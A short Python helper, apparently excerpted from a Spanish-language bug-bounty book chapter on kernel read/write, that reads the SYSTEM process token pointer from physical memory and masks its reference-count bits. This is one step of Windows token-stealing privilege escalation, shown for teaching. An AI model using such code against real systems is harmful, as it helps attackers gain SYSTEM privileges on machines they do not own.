# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
def read_system_token(phys_memory, system_eprocess_phys):
    """Lee el token del proceso SYSTEM."""
    token_raw = phys_memory.read_qword(
        system_eprocess_phys + OFFSET_TOKEN
    )
    # _EX_FAST_REF: bits 0-3 son ref count, bits 4-63 son el puntero
    token_ptr = token_raw & ~0xF
    return token_ptr
